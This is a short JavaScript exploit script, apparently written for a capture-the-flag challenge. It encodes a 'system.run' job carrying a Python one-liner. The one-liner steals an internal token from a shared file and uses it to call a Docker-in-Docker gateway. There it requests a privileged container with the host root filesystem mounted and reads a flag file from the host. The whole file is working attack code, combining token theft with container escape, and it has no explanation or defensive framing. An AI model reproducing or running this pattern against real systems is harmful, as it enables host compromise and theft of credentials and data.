function buildJob(handler, arg) {
  const enc = new TextEncoder();

  const h = enc.encode(handler);
  const a = enc.encode(arg);

  const buf = new ArrayBuffer(4 + h.length + 4 + a.length);
  const view = new DataView(buf);
  const out = new Uint8Array(buf);

  let offset = 0;

  view.setUint32(offset, h.length, false);
  offset += 4;

  out.set(h, offset);
  offset += h.length;

  view.setUint32(offset, a.length, false);
  offset += 4;

  out.set(a, offset);

  return out;
}

function toBase64(bytes) {
  let binary = "";

  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }

  return btoa(binary);
}

const cmd = `python3 -c 'import json,urllib.request; t=open("/app_shared/.internal_token").read().strip(); d={"token":t,"op":"run","image":"alpine","cmd":["/bin/sh","-c","cat /mnt/host/vault/flag.txt"],"binds":["/:/mnt/host"],"privileged":True}; r=urllib.request.Request("http://dind-gate:7000/rpc",data=json.dumps(d).encode(),headers={"Content-Type":"application/json"},method="POST"); print(urllib.request.urlopen(r).read().decode())'`;

const job = buildJob("system.run", cmd);
const bodyB64 = encodeURIComponent(toBase64(job));

console.log(bodyB64);
